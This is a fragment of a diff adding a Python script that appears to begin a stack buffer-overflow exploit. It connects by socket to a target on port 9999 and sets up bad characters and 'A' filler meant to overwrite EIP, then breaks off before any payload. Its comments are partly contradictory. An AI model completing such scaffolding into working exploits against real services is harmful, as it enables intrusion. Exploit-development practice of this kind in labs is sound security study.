import socket
+
+# Initialize IP and port to connect to
+ip = ''
+port = 9999
+
+# Connect to remote server
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip, port))
+
+'''
+The following list contains the characters to avoid
+when constructing the exploit: \x00 \x0A \x0D
+
+Spaces are also needed to ensure that EIP will be
+overwritten with 0x42424242. These characters are
+not necessary for the exploit to work, but if one of
+them is found, the exploit needs modification.
+'''
+
+chars_to_avoid = [0x00, 0x0A, 0x0D]
+
+# The following character will be used to construct the payload
+char_to_use = 0x41
+
+# This variable is used to check if the loop is finished
+badchars_found = False
+
+# These variable will contain the values of the two chars following EIP

